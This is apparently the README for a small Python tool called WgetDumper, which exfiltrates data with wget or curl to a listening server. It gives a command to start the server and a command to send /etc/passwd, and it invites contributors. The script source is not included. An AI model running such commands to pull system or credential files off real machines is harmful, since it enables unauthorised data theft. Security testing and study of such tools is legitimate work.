# WgetDumper
### Features

- Data exfiltration using wget command.
- You can also replace the wget to curl.

![](https://i.imgur.com/lF57ji6.jpg)




**How it works?**
The tool has 2 python scripts, a server side and client side. You need to start the server and use the sender to exfiltrate the data and send, you can exfiltrate a lot of kinds of files. Contribute, we need to implement more functions to turns it a incredible project.

*Note: The next version needs to handle lines with a wide range.*

**Server**
`$ python DumpServer.py 8080  `

**Sender**
`$ python WgetSender.py "/etc/passwd" `


### Running 
![](https://i.imgur.com/CnKEmHQ.gif)

